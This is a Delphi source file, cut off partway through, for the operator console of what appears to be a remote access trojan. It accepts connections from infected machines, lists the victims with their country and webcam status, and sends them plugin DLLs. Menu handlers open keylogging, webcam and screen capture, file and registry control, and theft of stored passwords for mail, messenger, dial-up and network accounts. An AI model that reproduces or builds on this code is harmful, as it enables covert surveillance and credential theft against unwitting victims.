unit UnitClient;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ScktComp, ComCtrls, StdCtrls,  ImgList, ExtCtrls, ImageHlp,
  Menus, UnitSHaredData, AppEvnts, ToolWin, StrUtils, IniFiles,
  SortListViews, Systray, Urlmon, ShellApi;

type
  TClient = class(TForm)
    ServerSocket1: TServerSocket;
    OpenDialog1: TOpenDialog;
    PopupMenu1: TPopupMenu;
    SystemInformation1: TMenuItem;
    Filemanager1: TMenuItem;
    MessageBox1: TMenuItem;
    ServiceManager1: TMenuItem;
    WindowManager1: TMenuItem;
    ProcessManager1: TMenuItem;
    InstalledApplications1: TMenuItem;
    ScreenCapture1: TMenuItem;
    KeyLogger1: TMenuItem;
    WebcamCapture1: TMenuItem;
    RegistryEditor1: TMenuItem;
    ApplicationEvents1: TApplicationEvents;
    FileSearch1: TMenuItem;
    ProtectedStorage: TMenuItem;
    DialUp1: TMenuItem;
    Messenger1: TMenuItem;
    Network1: TMenuItem;
    Mail1: TMenuItem;
    StatusBar1: TStatusBar;
    PageControl1: TPageControl;
    ImageList1: TImageList;
    ToolBar1: TToolBar;
    ToolButton1: TToolButton;
    ToolButton2: TToolButton;
    ImageList2: TImageList;
    TreeView1: TTreeView;
    Splitter1: TSplitter;
    ToolButton3: TToolButton;
    ToolButton4: TToolButton;
    PopupMenu2: TPopupMenu;
    Settings1: TMenuItem;
    SidePanel1: TMenuItem;
    Share1: TMenuItem;
    Timer1: TTimer;
    Shutdown1: TMenuItem;
    Reboot1: TMenuItem;
    LogOff1: TMenuItem;
    ImageList7: TImageList;
    ViewStyle1: TMenuItem;
    Icon1: TMenuItem;
    SmallIcon1: TMenuItem;
    Report1: TMenuItem;
    List1: TMenuItem;
    ransferManager1: TMenuItem;
    Close1: TMenuItem;
    Uninstall1: TMenuItem;
    EditIdentification1: TMenuItem;
    SystemManager1: TMenuItem;
    Surveillance1: TMenuItem;
    Files1: TMenuItem;
    PasswordAudit1: TMenuItem;
    Administration1: TMenuItem;
    Update1: TMenuItem;
    ClientToClientChat1: TMenuItem;
    System1: TMenuItem;
    Profile1: TMenuItem;
    CheckForUpdates1: TMenuItem;
    PopupMenu3: TPopupMenu;
    Exit1: TMenuItem;
    Show1: TMenuItem;
    N1: TMenuItem;
    Timer2: TTimer;
    Memo1: TMemo;
    UserFolder1: TMenuItem;
    ToolButton5: TToolButton;
    PluginMenu: TPopupMenu;
    Refresh1: TMenuItem;
    N2: TMenuItem;
    procedure ServerSocket1ClientRead(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure ServerSocket1ClientConnect(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure SystemInformation1Click(Sender: TObject);
    procedure ListView1DblClick(Sender: TObject);
    procedure Filemanager1Click(Sender: TObject);
    procedure MessageBox1Click(Sender: TObject);
    procedure ServiceManager1Click(Sender: TObject);
    procedure WindowManager1Click(Sender: TObject);
    procedure ProcessManager1Click(Sender: TObject);
    procedure InstalledApplications1Click(Sender: TObject);
    procedure ScreenCapture1Click(Sender: TObject);
    procedure KeyLogger1Click(Sender: TObject);
    procedure WebcamCapture1Click(Sender: TObject);
    procedure RegistryEditor1Click(Sender: TObject);
    procedure ApplicationEvents1Exception(Sender: TObject; E: Exception);
    procedure FileSearch1Click(Sender: TObject);
    procedure ProtectedStorageClick(Sender: TObject);
    procedure DialUp1Click(Sender: TObject);
    procedure Messenger1Click(Sender: TObject);
    procedure Network1Click(Sender: TObject);
    procedure Mail1Click(Sender: TObject);
    procedure ListView1SelectItem(Sender: TObject; Item: TListItem;
      Selected: Boolean);
    procedure FormResize(Sender: TObject);
    procedure ListView1AdvancedCustomDrawSubItem(Sender: TCustomListView;
      Item: TListItem; SubItem: Integer; State: TCustomDrawState;
      Stage: TCustomDrawStage; var DefaultDraw: Boolean);
    procedure FormCreate(Sender: TObject);
    procedure TreeView1DblClick(Sender: TObject);
    procedure Settings1Click(Sender: TObject);
    procedure Share1Click(Sender: TObject);
    procedure ServerSocket1ClientDisconnect(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure ServerSocket1ClientError(Sender: TObject;
      Socket: TCustomWinSocket; ErrorEvent: TErrorEvent;
      var ErrorCode: Integer);
    procedure Timer1Timer(Sender: TObject);
    procedure ListView1Deletion(Sender: TObject; Item: TListItem);
    procedure Shutdown1Click(Sender: TObject);
    procedure Reboot1Click(Sender: TObject);
    procedure LogOff1Click(Sender: TObject);
    procedure Icon1Click(Sender: TObject);
    procedure SmallIcon1Click(Sender: TObject);
    procedure Report1Click(Sender: TObject);
    procedure List1Click(Sender: TObject);
    procedure ransferManager1Click(Sender: TObject);
    procedure ToolButton3Click(Sender: TObject);
    procedure Close1Click(Sender: TObject);
    procedure Uninstall1Click(Sender: TObject);
    procedure EditIdentification1Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure Update1Click(Sender: TObject);
    procedure Exit1Click(Sender: TObject);
    procedure Show1Click(Sender: TObject);
    procedure Systray1Click(Sender: TObject);
    procedure Timer2Timer(Sender: TObject);
    procedure ApplicationEvents1Minimize(Sender: TObject);
    procedure ListView1CustomSort(Sender: TObject; ColIndex: Integer;
      Str1, Str2: String; var Res: Integer; var Handled: Boolean);
    procedure Profile1Click(Sender: TObject);
    procedure CheckForUpdates1Click(Sender: TObject);
    procedure SidePanel1Click(Sender: TObject);
    procedure ToolButton4Click(Sender: TObject);
    procedure ClientToClientChat1Click(Sender: TObject);
    procedure UserFolder1Click(Sender: TObject);
    procedure Refresh1Click(Sender: TObject);
    procedure ListView1AdvancedCustomDrawItem(Sender: TCustomListView;
      Item: TListItem; State: TCustomDrawState; Stage: TCustomDrawStage;
      var DefaultDraw: Boolean);
    procedure ListView1AdvancedCustomDraw(Sender: TCustomListView;
      const ARect: TRect; Stage: TCustomDrawStage;
      var DefaultDraw: Boolean);
  private
    { Private declarations }
  public
    { Public declarations }
    ConnectionCount: integer;
    LastSocket: TCustomwinsocket;
    LastItem: TListItem;
    PointerList: TList;
    SysTrayIcon: TSystray;
    procedure UpdatePlugins;
    procedure MenuItemClick(Sender: TObject);
    function SendData(Socket: TCustomWinSocket; Data: string): bool;
  end;

  TSendFile = class
    Socket: tcustomwinsocket;
    Data: string;
  end;



var
  Client: TClient;

implementation

{$R *.dfm}

uses
  UnitSystemInformation, UnitContainer, UnitFileManager, UnitMessageBox,
  UnitServiceManager, UnitWindowManager, UnitProcessManager, UnitInstalledApplications,
  UnitScreenCapture, UnitKeyLogger, UnitWebcam, UnitRegEdit, UnitFIleSearch,
  UnitPasswordManager, UnitSettings, UnitShareServer, UnitTransferManager,
  UnitCreateServer, UnitEditIdentification, UnitConnection, UnitProfile,
  UnitAbout, UnitClientToClient;

function DeleteAllLetters(s: string): string;
begin
  s := lowercase(s);
  if pos('a',s) > 0 then s := ansireplacestr(s,'a','');
  if pos('b',s) > 0 then s := ansireplacestr(s,'b','');
  if pos('c',s) > 0 then s := ansireplacestr(s,'c','');
  if pos('d',s) > 0 then s := ansireplacestr(s,'d','');
  if pos('e',s) > 0 then s := ansireplacestr(s,'e','');
  if pos('f',s) > 0 then s := ansireplacestr(s,'f','');
  if pos('g',s) > 0 then s := ansireplacestr(s,'g','');
  if pos('h',s) > 0 then s := ansireplacestr(s,'h','');
  if pos('i',s) > 0 then s := ansireplacestr(s,'i','');
  if pos('j',s) > 0 then s := ansireplacestr(s,'j','');
  if pos('k',s) > 0 then s := ansireplacestr(s,'k','');
  if pos('l',s) > 0 then s := ansireplacestr(s,'l','');
  if pos('m',s) > 0 then s := ansireplacestr(s,'m','');
  if pos('n',s) > 0 then s := ansireplacestr(s,'n','');
  if pos('o',s) > 0 then s := ansireplacestr(s,'o','');
  if pos('p',s) > 0 then s := ansireplacestr(s,'p','');
  if pos('q',s) > 0 then s := ansireplacestr(s,'q','');
  if pos('r',s) > 0 then s := ansireplacestr(s,'r','');
  if pos('s',s) > 0 then s := ansireplacestr(s,'s','');
  if pos('t',s) > 0 then s := ansireplacestr(s,'t','');
  if pos('u',s) > 0 then s := ansireplacestr(s,'u','');
  if pos('v',s) > 0 then s := ansireplacestr(s,'v','');
  if pos('w',s) > 0 then s := ansireplacestr(s,'w','');
  if pos('x',s) > 0 then s := ansireplacestr(s,'x','');
  if pos('y',s) > 0 then s := ansireplacestr(s,'y','');
  if pos('z',s) > 0 then s := ansireplacestr(s,'z','');
  if pos('|',s) > 0 then s := ansireplacestr(s,'|','');
  result := s;
end;

procedure SendFileProc(Data: pointer); stdcall;
var
  SendFile: TSendFile;
  SocketData: TSocketData;
  T2,Temp: string;
  SendData: procedure(Socket: TCustomwinSocket; Length: int64) ;
begin
  SendFile := TSendFile(Data);

  SocketData := TSocketData(SendFile.Socket.Data);
  TSocketData(SendFile.Socket.Data).CanSend := False;

  while Length(SendFile.Data) > 0 do begin
    application.ProcessMessages;
    sleep(10);


    Temp := Copy(SendFile.Data,1,4096);
    Delete(SendFile.Data,1,Length(Temp));
    repeat
      application.ProcessMessages;
      Sleep(10);
    until SendFile.Socket.SendBuf(pointer(Temp)^,length(Temp)) <> -1;

    if SocketData.SendData <> nil then begin
      @SendData := SocketData.SendData;
      SendData(SendFile.Socket,Length(Temp));
    end;

  end;
end;

function ValidPtr(P: pointer; Size: Cardinal): boolean;
begin
  Result := not IsBadReadPtr(P, Size);
end;

function TClient.SendData(Socket: TCustomWinSocket; Data: string): bool;
var
  SendData: procedure(Socket: TCustomwinSocket; Length: int64);
  StartSend: procedure(Socket: TCustomwinSocket; Length: int64);
  SocketData: TSocketData;
  SendFile: TSendFile;
  Thr: dword;
begin
  Sleep(100);
  Result := False;

  if not Socket.Connected then exit;
  if not ValidPtr(Socket.Data,SizeOf(TClientSocket)) then exit;

  SocketData := TSocketData(Socket.Data);
  TSocketData(Socket.Data).CanSend := False;

  if SocketData.StartSend <> nil then begin
    @StartSend := SocketData.StartSend;
    StartSend(Socket,Length(Data));
  end;

  Socket.SendText('SizeOf|' + inttostr(length(Data)));
  while not TSocketData(Socket.Data).CanSend do begin
    Application.ProcessMessages;
    Sleep(10);
  end;

  //if Length(Data) >= 4096 then begin
    SendFile := TSendFile.Create;
    SendFile.Socket := Socket;
    SendFile.Data := Data;
    CreateThread(nil,0,@SendFileProc,pointer(SendFile),0,Thr);
  {end else begin
    if SocketData.SendData <> nil then begin
      @SendData := SocketData.SendData;
      SendData(Socket,Length(Data));
    end;
    Socket.SendText(Data);
  end;

  //Result := True;
  //if not Socket.Connected then Result := False;  }
end;

Procedure SendPluginData(Socket: TCustomWinSocket; PluginName,Data: string);
begin
  Client.SendData(Socket,'RunPlugin|' + PluginName + '|' + Data);
end;

function LoadPluginData(ResName: string): string;
var
  ResourceLocation: HRSRC;
  ResourceSize: dword;
  ResourceHandle: THandle;
  ResourcePointer: pointer;
begin
  ResourceLocation := FindResource(hinstance,pchar(uppercase(ResName)), RT_RCDATA);
  ResourceSize := SizeofResource(hinstance, ResourceLocation);
  ResourceHandle := LoadResource(hinstance, ResourceLocation);
  ResourcePointer := LockResource(ResourceHandle);
  if ResourcePointer <> nil then begin
    SetLength(Result, ResourceSize);
    CopyMemory(@Result[1], ResourcePointer, ResourceSize);
    FreeResource(ResourceHandle);
  end;
end;

procedure TClient.ServerSocket1ClientRead(Sender: TObject; Socket: TCustomWinSocket);
var
  Data: string;
  Command: string;
  FileData: string;
  SocketData: TSocketData;
  RecieveData: procedure(Socket: TCustomwinSocket; Data: string);
  RecieveComplete: procedure(Socket: TCustomwinSocket; Data: string);
  RecieveLength: procedure(Socket: TCustomwinSocket; Length: int64);
  Initialize: procedure(Socket: TCustomWinSocket; SendDataPointer: pointer; Handle: THandle);
  li: tlistitem;
  Stream: TMemorystream;
  Listview: TSortListview;
  TabSheet: TTabSheet;
  Col: TListColumn;
  x,i: integer;
  NewName,Country,temp,groupName: string;
  TabData: TTabData;
  Ini: TIniFile;
  Connection: TConnection;
  FileHandle: THandle;
  FileSIze,BytesRead: dword;
  DllHandle: THandle;
begin
  Application.ProcessMessages;
  //DataSize := Socket.ReceiveLength;
  //SetLength(Data,DataSize);
  //Socket.ReceiveBuf(pointer(Data)^,DataSize);
  Data := Socket.ReceiveText;

  if Socket.Data = nil then begin
    Socket.Data := TSocketData.Create;
  end;
  SocketData := TSocketData(Socket.Data);

  //SocketData.Data := SocketData.Data + Data;

  Command := Split(Data,'|',1);

  if Command = 'SizeOf' then begin
    Data := DeleteAllLetters(Data);
    SocketData.StreamSize := strtoint(Data);
    SocketData.Data := '';
    if SocketData.RecieveLength <> nil then begin
      @RecieveLength := SocketData.RecieveLength;
      RecieveLength(Socket,SocketData.StreamSize);
    end;
    Sleep(100);
    Socket.SendText('SendData');
    exit;
  end;

  if Command = 'SendData' then begin
    SocketData.CanSend := True;
    exit;
  end;

  if Command = 'Ping' then begin
    SocketData.MainListItem.SubItems[4] := inttostr(GetTickCount - SocketData.PingSent);
    exit;
  end;


  SocketData.Data := SocketData.Data + Data;


  if SocketData.RecieveData <> nil then begin
    @RecieveData := SocketData.RecieveData;
    RecieveData(Socket,Data);
  end;

  if length(SocketData.Data) < SocketData.StreamSize then exit;



  if SocketData.RecieveComplete <> nil then begin
    @RecieveComplete := SocketData.RecieveComplete;
    RecieveComplete(Socket,SocketData.Data);
  end;

  Command := split(Data,'|',1);
  Delete(Data,1,Length(Command)+1);

  if Command = 'OnConnect' then begin

    if Split(Data,'|',8) = 'ChangeName' then begin
      if SocketData.MainListItem <> nil then SocketData.MainListItem.Delete;
      SocketData.MainListItem := nil;
    end;

    GroupName := Split(Data,'|',1);
    Delete(Data,1,Length(GroupName)+1);

    for i := 0 to PointerList.Count -1 do begin
      if GroupName = TTabData(PointerList.Items[i]).TabSheet.Caption then begin
        TabSheet := TTabData(PointerList.Items[i]).TabSheet;
        Listview := TTabData(PointerList.Items[i]).Listview;
      end;
    end;

    if not assigned(TabSheet) then begin
      TabSheet := ttabsheet.Create(pagecontrol1);
      TabSheet.PageControl := pagecontrol1;
      TabSheet.Caption := GroupName;
      TabSheet.ImageIndex := -1;

      ListView := tSortlistview.Create(TabSheet);
      ListView.Parent := TabSheet;
      ListView.Align := alclient;
      ListView.ViewStyle := vsReport;
      ListView.ReadOnly := True;
      ListView.RowSelect := True;
      ListView.GridLines := True;
      ListView.PopupMenu := Popupmenu1;
      ListView.OnSelectItem := Client.ListView1SelectItem;
      ListView.OnDeletion := Client.ListView1Deletion;
      ListView.SmallImages := ImageList1;
      ListView.LargeImages := ImageList1;
      ListView.HideSelection := False;
      ListView.OnCustomSort := Client.ListView1CustomSort;

      if Icon1.Checked then Listview.ViewStyle := vsIcon;
      if SmallIcon1.Checked then Listview.ViewStyle := vsSmallIcon;
      if Report1.Checked then Listview.ViewStyle := vsReport;
      if List1.Checked then Listview.ViewStyle := vsList;
      ListView.OnAdvancedCustomDrawSubItem := Client.ListView1AdvancedCustomDrawSubItem;
      Listview.OnAdvancedCustomDraw := Client.ListView1AdvancedCustomDraw;
      Listview.OnAdvancedCustomDrawItem := Client.ListView1AdvancedCustomDrawItem;

      for i := 0 to 5 do begin
        Col := Listview.Columns.Add;

        if i = 0 then begin
          Col.Caption := 'Identification';
          Col.Width := 100;
        end;

        if i = 1 then begin
          Col.Caption := 'Computer - User Name';
          Col.Width := 200;
        end;

        if i = 2 then begin
          Col.Caption := 'Address - Port';
          Col.Width := 200;
        end;

        if i = 3 then begin
          Col.Caption := 'Webcam';
          Col.Width := 80;
        end;

        if i = 4 then begin
          Col.Caption := 'Version';
          Col.Width := 50;
          Col.Alignment := taRightJustify;
        end;

        if i = 5 then begin
          Col.Caption := 'Ping';
          Col.Width := 50;
          Col.Alignment := taRightJustify;
        end;


      end;



      TabData := TTabData.Create;
      TabData.Listview := Listview;
      TabData.TabSheet := TabSheet;
      PointerList.Add(TabData);

      ListView.Visible := true;
    end;



    li := listview.items.add;
    li.data := socket;
    li.Caption := split(Data,'|',1);
    li.SubItems.Add(split(Data,'|',2));
    li.SubItems.Add(split(Data,'|',3) + ' - ' + Socket.RemoteAddress + ' - ' + inttostr(Socket.LocalPort));
    li.SubItems.Add(split(Data,'|',4));
    li.SubItems.Add(split(Data,'|',5));
    li.SubItems.Add('');

    TSocketData(Socket.Data).MainListItem := Li;
    TSocketData(Socket.Data).OriginalGroup := GroupName;
    TSocketData(Socket.Data).Originalname := Li.Caption;
    TSocketData(Socket.Data).PingRecieved := True;

    Country := split(Data,'|',6);

    Country := lowercase(Country);
    li.ImageIndex := 27;
    if Country = 'united kingdom' then li.ImageIndex := 0;
    if Country = 'united states' then li.ImageIndex := 1;
    if Country = 'sweden' then li.ImageIndex := 2;
    if Country = 'taiwan' then li.ImageIndex := 6;
    if Country = 'switzerland' then li.ImageIndex := 5;
    if Country = 'spain' then li.ImageIndex := 7;
    if pos('korea',Country) > 0 then li.ImageIndex := 8;
    if pos('china',Country) > 0 then li.ImageIndex := 9;
    if Country = 'portugal' then li.ImageIndex := 29;
    if Country = 'norway' then li.ImageIndex := 10;
    if Country = 'new zealand' then li.ImageIndex := 11;
    if Country = 'netherlands' then li.ImageIndex := 12;
    if Country = 'mexico' then li.ImageIndex := 13;
    if Country = 'japan' then li.ImageIndex := 4;
    if Country = 'italy' then li.ImageIndex := 14;
    if Country = 'iceland' then li.ImageIndex := 15;
    if Country = 'ireland' then li.ImageIndex := 16;
    if Country = 'germany' then li.ImageIndex := 17;
    if Country = 'france' then li.ImageIndex := 18;
    if Country = 'finland' then li.ImageIndex := 19;
    if Country = 'denmark' then li.ImageIndex := 20;
    if Country = 'canada' then li.ImageIndex := 21;
    if Country = 'brazil' then li.ImageIndex := 22;
    if Country = 'belgium' then li.ImageIndex := 23;
    if Country = 'austria' then li.ImageIndex := 24;
    if Country = 'australia' then li.ImageIndex := 25;
    if Country = 'thailand' then li.ImageIndex := 30;
    if Country = 'poland' then li.ImageIndex := 31;
    if Country = 'egypt' then li.ImageIndex := 32;
    if Country = 'bahrain' then li.ImageIndex := 33;
    if Country = 'russia' then li.ImageIndex := 34;
    if Country = 'qatar' then li.ImageIndex := 35;
    if Country = 'saudi arabia' then li.ImageIndex := 36;
    if Country = 'viet nam' then li.ImageIndex := 37;
    if Country = 'guatemala' then li.ImageIndex := 38;
    if Country = 'bolivia' then li.ImageIndex := 39;
    if Country = 'peru' then li.ImageIndex := 40;
    if Country = 'liechtenstein' then li.ImageIndex := 41;
    if Country = 'turkey' then li.ImageIndex := 42;
    TSocketData(Socket.Data).OriginalIcon := Li.ImageIndex;
    LastSocket := nil;

    if SidePanel1.Checked then begin
      Splitter1.Show;
      Treeview1.Show;
    end;



    if Split(Data,'|',7) <> 'ChangeName' then begin

      try
        Ini := TIniFile.Create(Settings.Edit1.Text + 'Users\' + Li.SubItems[0] + '\Profile.ini');
        NewName := Ini.ReadString('Profile','UserName','');
        if NewName <> '' then SendData(Socket,'ChangeName|' + NewName);
      finally


        if Settings.CheckBox3.Checked then begin
          Connection := TCOnnection.Create(nil);
          Connection.Label2.Caption := GroupName;
          Connection.Label6.Caption := Li.Caption;
          Connection.Label4.Caption := Li.SubItems[1] + '  ';
          try
            Connection.Image1.Picture.LoadFromFile(Ini.ReadString('Profile','Image','',));
          except
          end;
          ShowWindow(Connection.Handle,SW_SHOWNOACTIVATE);
        end;

        Ini.Free;

      end;

    end;



  end;

  if Command = 'NoPlugin' then begin

    //check here for replacements plugins
    FileHandle := CreateFile(pchar(extractfilepath(application.ExeName) + 'ServerPlugins\' + Data + '.dll'),GENERIC_READ,FILE_SHARE_READ,nil,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
    if FileHandle <> INVALID_HANDLE_VALUE then begin
      FileSize := GetFileSize(FileHandle,nil);
      Setlength(FileData,FileSize);
      ReadFile(FileHandle,pointer(FileData)^,FileSize,BytesRead,nil);
      CloseHandle(FileHandle);
      SendData(Socket,'RecievePlugin|' + Data + '|' + FileData);
      exit;
    end;

    FileData := LoadPluginData(Data);
    if FileData <> '' then begin
      SendData(Socket,'RecievePlugin|' + Data + '|' + FileData);
      exit;
    end;

  end;


  if Command = 'RunClientPlugin' then begin


    DllHandle := GetModuleHandle(pchar(extractfilepath(application.ExeName) + 'Plugins\' + split(Data,'|',1) + '.dll'));
    if DllHandle = 0 then begin
      DllHandle := LoadLibrary(pchar(extractfilepath(application.ExeName) + 'Plugins\' + split(Data,'|',1) + '.dll'));
      if Dllhandle = 0 then exit;
    end;

    SocketData.RecieveLength := GetProcAddress(DllHandle,'RecieveLength');
    SocketData.RecieveData := GetProcAddress(DllHandle,'RecieveData');
    SocketData.RecieveComplete := GetProcAddress(DllHandle,'RecieveComplete');
    SocketData.StartSend := GetProcAddress(DllHandle,'StartSend');
    SocketData.SendData := GetProcAddress(DllHandle,'SentData');
    SocketData.OnSocketClose := GetProcAddress(DllHandle,'SocketClose');

    Initialize := GetProcAddress(DllHandle,'Initialize');
    if @Initialize <> nil then Initialize(Socket,@SendPluginData,Application.Handle);
    if SocketData.Form <> nil Then begin
      SocketData.Form.Caption :=  split(Data,'|',1) + ' - ' + split(Data,'|',2);
      SocketData.Form.Icon := Icon;
    end;
      //showmessage('run plugin here');
  end;


end;

procedure TClient.ServerSocket1ClientConnect(Sender: TObject; Socket: TCustomWinSocket);
begin
  LastSocket := Socket;
end;

procedure TClient.SystemInformation1Click(Sender: TObject);
var
  SystemInformation: TSystemInformation;
  Socket: TCustomWinSocket;
begin
  if not assigned(LastItem) then exit;
  Socket := TCustomWinSocket(LastItem.Data);
  SystemInformation := TSystemInformation.Create(application);
  SystemInformation.MainItem := LastItem;
  SystemInformation.MainSocket := Socket;
  SystemInformation.Caption := 'System Information - '  + LastItem.Caption;
  Socket.SendText('NewConnection');
end;

procedure TClient.ListView1DblClick(Sender: TObject);
var
  Container: TContainer;
  Socket: TCustomWinSocket;
begin
  if not assigned(LastItem) then exit;
  Socket := TCustomWinSocket(LastItem.Data);
  Container := TContainer.Create(nil);
  Container.MainSocket := Socket;
  Container.Show;

end;

procedure TClient.Filemanager1Click(Sender: TObject);
var
  FileManager: TFileManager;
  Socket: TCustomWinSocket;
begin
  if not assigned(LastItem) then exit;
  Socket := TCustomWinSocket(LastItem.Data);
  FileManager := TFileManager.Create(application);
  FileManager.MainItem := LastItem;
  FileManager.MainSocket := Socket;
  FileManager.Caption := 'FileManager - '  + LastItem.Caption;
  Socket.SendText('NewConnection');
end;

procedure TClient.MessageBox1Click(Sender: TObject);
var
  MessageBox: TMessageBoxForm;
  Socket: TCustomWinSocket;
begin
  if not assigned(LastItem) then exit;
  Socket := TCustomWinSocket(LastItem.Data);
  MessageBox := TMessageBoxForm.Create(application);
  MessageBox.MainItem := LastItem;
  MessageBox.MainSocket := Socket;
  MessageBox.Caption := 'MessageBox - '  + LastItem.Caption;
  Socket.SendText('NewConnection');
end;

procedure TClient.ServiceManager1Click(Sender: TObject);
var
  ServiceManager: TServiceManager;
  Socket: TCustomWinSocket;
begin
  if not assigned(LastItem) then exit;
  Socket := TCustomWinSocket(LastItem.Data);
  ServiceManager := TServiceManager.Create(application);
  ServiceManager.MainItem := LastItem;
  ServiceManager.MainSocket := Socket;
  ServiceManager.Caption := 'ServiceManager - '  + LastItem.Caption;
  Socket.SendText('NewConnection');
end;

procedure TClient.WindowManager1Click(Sender: TObject);
var
  WindowManager: TWindowManager;
  Socket: TCustomWinSocket;
begin
  if not assigned(LastItem) then exit;
  Socket := TCustomWinSocket(LastItem.Data);
  WindowManager := TWindowManager.Create(application);
  WindowManager.MainItem := LastItem;
  WindowManager.MainSocket := Socket;
  WindowManager.Caption := 'WindowManager - '  + LastItem.Caption;
  Socket.SendText('NewConnection');
end;


procedure TClient.ProcessManager1Click(Sender: TObject);
var
  ProcessManager: TProcessManager;
  Socket: TCustomWinSocket;
begin
  if not assigned(LastItem) then exit;
  Socket := TCustomWinSocket(LastItem.Data);
  ProcessManager := TProcessManager.Create(application);
  ProcessManager.MainItem := LastItem;
  ProcessManager.MainSocket := Socket;
  ProcessManager.Caption := 'ProcessManager - '  + LastItem.Caption;
  Socket.SendText('NewConnection');
end;

procedure TClient.InstalledApplications1Click(Sender: TObject);
var
  InstalledApplications: TInstalledApplications;
  Socket: TCustomWinSocket;
begin
  if not assigned(LastItem) then exit;
  Socket := TCustomWinSocket(LastItem.Data);
  InstalledApplications := TInstalledApplications.Create(application);
  InstalledApplications.MainItem := LastItem;
  InstalledApplications.MainSocket := Socket;
  InstalledApplications.Caption := 'InstalledApplications - '  + LastItem.Caption;
  Socket.SendText('NewConnection');
end;

procedure TClient.ScreenCapture1Click(Sender: TObject);
var
  ScreenCapture: TScreenCapture;
  Socket: TCustomWinSocket;
begin
  if not assigned(LastItem) then exit;
  Socket := TCustomWinSocket(LastItem.Data);
  ScreenCapture := TScreenCapture.Create(application);
  ScreenCapture.MainSocket := Socket;
  ScreenCapture.MainItem := LastItem;
  ScreenCapture.WindowHandle := 0;
  ScreenCapture.Caption := 'ScreenCapture - '  + LastItem.Caption;
  Socket.SendText('NewConnection');
end;

procedure TClient.KeyLogger1Click(Sender: TObject);
var
  KeyLogger: TKeyLogger;
  Socket: TCustomWinSocket;
begin
  if not assigned(LastItem) then exit;
  Socket := TCustomWinSocket(LastItem.Data);
  KeyLogger := TKeyLogger.Create(application);
  KeyLogger.MainSocket := Socket;
  KeyLogger.MainItem := LastItem;
  KeyLogger.Caption := 'KeyLogger - '  + LastItem.Caption;
  Socket.SendText('NewConnection');
end;

procedure TClient.WebcamCapture1Click(Sender: TObject);
var
  WebCam: TWebCam;
  Socket: TCustomWinSocket;
begin
  if not assigned(LastItem) then exit;
  Socket := TCustomWinSocket(LastItem.Data);
  WebCam := TWebCam.Create(application);
  WebCam.MainSocket := Socket;
  WebCam.MainItem := LastItem;
  WebCam.Caption := 'WebCam - '  + LastItem.Caption;
  Socket.SendText('NewConnection');
end;




procedure TClient.RegistryEditor1Click(Sender: TObject);
var
  RegEdit: TRegEdit;
  Socket: TCustomWinSocket;
begin
  if not assigned(LastItem) then exit;
  Socket := TCustomWinSocket(LastItem.Data);
  RegEdit := TRegEdit.Create(application);
  RegEdit.MainSocket := Socket;
  RegEdit.MainItem := LastItem;
  RegEdit.Caption := 'RegEdit - '  + LastItem.Caption;
  Socket.SendText('NewConnection');
end;

procedure TClient.ApplicationEvents1Exception(Sender: TObject;
  E: Exception);
begin
  application.ProcessMessages;
end;

procedure TClient.FileSearch1Click(Sender: TObject);
var
  FileSearch: TFileSearch;
  Socket: TCustomWinSocket;
begin
  if not assigned(LastItem) then exit;
  Socket := TCustomWinSocket(LastItem.Data);
  FileSearch := TFileSearch.Create(application);
  FileSearch.MainSocket := Socket;
  FileSearch.MainItem := LastItem;
  FileSearch.Caption := 'FileSearch - ' + LastItem.Caption;
  Socket.SendText('NewConnection');
end;

procedure TClient.ProtectedStorageClick(Sender: TObject);
var
  PasswordManager: TPasswordManager;
  Socket: TCustomWinSocket;
begin
  if not assigned(LastItem) then exit;
  Socket := TCustomWinSocket(LastItem.Data);
  PasswordManager := TPasswordManager.Create(application);
  PasswordManager.MainSocket := Socket;
  PasswordManager.PasswordType := 'Protected Storage';
  PasswordManager.MainItem := LastItem;
  PasswordManager.Caption := 'Protected Storage - ' + LastItem.Caption;
  PasswordManager.ListView1.BringToFront;
  Socket.SendText('NewConnection');
end;

procedure TClient.DialUp1Click(Sender: TObject);
var
  PasswordManager: TPasswordManager;
  Socket: TCustomWinSocket;
begin
  if not assigned(LastItem) then exit;
  Socket := TCustomWinSocket(LastItem.Data);
  PasswordManager := TPasswordManager.Create(application);
  PasswordManager.MainSocket := Socket;
  PasswordManager.PasswordType := 'Dial Up';
  PasswordManager.MainItem := LastItem;
  PasswordManager.Caption := 'Dial Up - ' + LastItem.Caption;
  PasswordManager.ListView2.BringToFront;
  Socket.SendText('NewConnection');
end;


procedure TClient.Messenger1Click(Sender: TObject);
var
  PasswordManager: TPasswordManager;
  Socket: TCustomWinSocket;
begin
  if not assigned(LastItem) then exit;
  Socket := TCustomWinSocket(LastItem.Data);
  PasswordManager := TPasswordManager.Create(application);
  PasswordManager.MainSocket := Socket;
  PasswordManager.PasswordType := 'Messenger';
  PasswordManager.MainItem := LastItem;
  PasswordManager.Caption := 'Messenger - ' + LastItem.Caption;
  PasswordManager.ListView3.BringToFront;
  Socket.SendText('NewConnection');
end;

procedure TClient.Network1Click(Sender: TObject);
var
  PasswordManager: TPasswordManager;
  Socket: TCustomWinSocket;
begin
  if not assigned(LastItem) then exit;
  Socket := TCustomWinSocket(LastItem.Data);
  PasswordManager := TPasswordManager.Create(application);
  PasswordManager.MainSocket := Socket;
  PasswordManager.PasswordType := 'Network';
  PasswordManager.MainItem := LastItem;
  PasswordManager.Caption := 'Network - ' + LastItem.Caption;
  PasswordManager.ListView4.BringToFront;
  Socket.SendText('NewConnection');
end;

procedure TClient.Mail1Click(Sender: TObject);
var
  PasswordManager: TPasswordManager;
  Socket: TCustomWinSocket;
begin
  if not assigned(LastItem) then exit;
  Socket := TCustomWinSocket(LastItem.Data);
  PasswordManager := TPasswordManager.Create(application);
  PasswordManager.MainSocket := Socket;
  PasswordManager.PasswordType := 'Mail';
  PasswordManager.MainItem := LastItem;
  PasswordManager.Caption := 'Mail - ' + LastItem.Caption;
  PasswordManager.ListView5.BringToFront;
  Socket.SendText('NewConnection');
end;

procedure TClient.ListView1SelectItem(Sender: TObject; Item: TListItem;
  Selected: Boolean);
begin
  LastItem := Item;
  Statusbar1.Panels[0].Text := 'Selected User: ' + Item.Caption;
end;

procedure TClient.FormResize(Sender: TObject);
begin
  Statusbar1.Panels[0].Width := Width - 150;
end;



procedure TClient.FormCreate(Sender: TObject);
var
  i: integer;
